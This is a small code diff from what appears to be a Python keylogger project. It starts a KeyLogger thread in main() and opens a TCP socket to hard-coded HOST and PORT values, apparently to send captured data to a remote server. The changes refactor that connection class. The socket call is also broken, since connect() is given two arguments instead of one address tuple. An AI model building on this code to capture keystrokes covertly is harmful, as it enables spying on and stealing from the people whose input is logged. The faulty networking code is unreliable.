@@ -44,11 +44,9 @@ class AppStart:
 
 
 class NetworkConnection:
-    port = PORT
-    host = HOST
-    def __init__(self, host, port):
+    def __init__(self):
         self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        self.sock.connect(host, port)
+        self.sock.connect(HOST, PORT)
         self.buffer = ""
 
     def write(self, data):
@@ -511,7 +509,6 @@ class ServerGUI(QWidget):
 
 
 def main():
-    network = NetworkConnection()
     
     keylogger = KeyLogger()
     threading.Thread(target=keylogger.startKLog).start()
